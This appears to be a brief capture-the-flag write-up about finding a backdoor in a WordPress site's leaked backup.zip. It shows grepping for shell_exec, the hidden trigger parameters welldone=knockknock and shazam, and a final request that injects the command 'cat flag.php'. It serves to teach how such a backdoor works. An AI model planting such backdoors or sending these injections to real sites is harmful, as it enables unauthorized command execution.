"Our website has been breached multiple times. Now we even found a backup.zip in a public path and still can not find the backdoor."
we see a basic wordpress page
as mentioned in the description we try
wget http://34.107.45.207:30148//backup.zip 
we can unzip it and check vulnerability
https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720
inside the backup folder we use
grep -r "shell_exec("
if we have welldone=knockknock, then shazam=<injection> 
now we can check the page source of the website and successfully find the flag
?welldone=knockknock&shazam=cat flag.php
